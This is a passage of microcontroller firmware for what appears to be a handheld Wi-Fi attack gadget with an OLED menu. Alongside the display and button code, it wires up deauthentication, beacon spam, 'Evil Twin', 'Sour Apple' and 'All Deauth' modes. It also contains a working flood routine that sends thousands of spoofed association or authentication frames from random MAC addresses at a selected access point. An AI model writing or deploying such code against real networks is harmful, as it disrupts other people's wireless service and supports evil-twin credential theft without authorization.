              draw_menu(menu_name_handle, selected_menu);
              becaon_break_flag = false;
              break;
            case 1:
              if(!becaon_break_flag) becaon(1);
              draw_menu(menu_name_handle, selected_menu);
              becaon_break_flag = false;
              break;
          }
          break;
        default:
          Serial.println("ERROR");
          Serial.println(menu_func_state);
          break;
      }
    }
    if (ButtonPress(btnUp)) {
      buttonPressed = true;
      if (selected_menu == menu_name_handle.size() - 1) {
        selected_menu = selected_menu;
      } else {
        selected_menu++;
        Serial.println(selected_menu);
        draw_menu(menu_name_handle, selected_menu);
        Serial.println("UP");
      }
    }
    if (ButtonPress(btnDown)) {
      buttonPressed = true;
      if (selected_menu == 0) {
        selected_menu = 0;
      } else {
        selected_menu--;
        Serial.println(selected_menu);
        draw_menu(menu_name_handle, selected_menu);
        Serial.println("DOWN");
      }
    }
  }
}
void AT_draw_func(int state){
  if(wifi_working){
    showPopup("WIFI WORKING");
    return;
  }
  display_working = true;
  display_init();
  deauth_break_flag = false;
  //becaon_break_flag = false;
  while(true){
    if(ButtonPress(btnBack)){
      
      draw_menu(at_names, selected_menu);
      break;
    }
    if(at_names[state] == "Evil Twin"){
      ET_Selected();
      Evil_Twin();
      break;
    }
    if (at_names[state] == "Beacon"){
      //selected_menu = state;
      selected_menu = 0;
      draw_menu(becaon_names,0);
      selection_handdler(becaon_names,2);
      break;
    }
    display.clearDisplay();
    display.drawRoundRect(0, 0, 128, 16, 4, WHITE);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(6, 3);
    display.println("STATE");
    display.drawFastHLine(0, 17, 128, WHITE);
    display.setTextColor(WHITE);
    display.setCursor(4, 22);
    display.println(at_names[state]);
    const int cx = 110, cy = 26, r = 5;
    display.fillCircle(cx, cy, r, WHITE);
    display.drawCircle(cx, cy, r, WHITE); 
    display.display();
    if (SelectedItem.size() == 0) SelectedItem.push_back(0);
    if (at_names[state] == "Deauth") deauth(0);
    if (at_names[state] == "All Deauth") deauth(1);
    if(at_names[state] == "Sour Apple"){
      SourApple();
      break;
    }
    if(at_names[state] == "Association"){
      auth_assoc(0);
      break;
    }
    if(at_names[state] == "Authentication"){
      auth_assoc(1);
      break;
    }

    if(deauth_break_flag){
      //selected_menu = state;
      draw_menu(at_names, selected_menu);
      break;
    }
  }
}


bool assoc_flag = true;


void flood(const uint8_t* bssid, const char* ssid, uint32_t count, uint16_t delay_ms,int state){
  uint8_t random_src[6];
  for (uint32_t i = 0; i < count; i++) {
    if(ButtonPress(btnBack)) {
      assoc_flag = false;
      break;
    }
    random_mac(random_src);
    uint16_t seq = i & 0xFFF;
    switch(state){
      case 0:
        break;
      case 1:
        wifi_tx_assoc_frame(random_src, (void*)bssid, ssid, seq);
        break;
      case 2:
        break;
      case 3:
        wifi_tx_auth_frame(random_src, (void*)bssid, seq);
        break;
    if (delay_ms) delay(delay_ms);
    }
  }
}
void auth_assoc(int state){
  assoc_flag = true;
  if(SelectedItem.size() == 1){
    while(assoc_flag){
      RuningProgressBar();
      display.display();
      int idx = SelectedItem[0];
      int ch = scan_results[idx].channel;
      String SSID = scan_results[idx].ssid;
      wext_set_channel(WLAN0_NAME,ch);
      memcpy(deauth_bssid,scan_results[idx].bssid,6);
      switch(state){
        case 0:{
          if( ch > 14){
            display.clearDisplay();
            showPopup("5Ghz Not Support");
            assoc_flag = false;
          }
          flood(deauth_bssid,SSID.c_str(),5000,2,1);
          break;
        }
        case 1:{
          flood(deauth_bssid,SSID.c_str(),5000,2,3);
          break;
        }
      }

    }
  }
  else{
    display.clearDisplay();
    showPopup("Please select one ssid for performance");
  }
}
void webUI(){
  display_init();
  display.clearDisplay();
  display.println("WEB UI RUNNING");
  display.display();
  while(true){
    web_stable();
    if(ButtonPress(btnBack)){
      selected_menu = 0;
      display.clearDisplay();
      //prev_selected = -1;
      draw_menu(main_names, 0);
      break;
    }
  }
}
void display_update(){
  selection_handdler(main_names, 0);
  webUI();
}
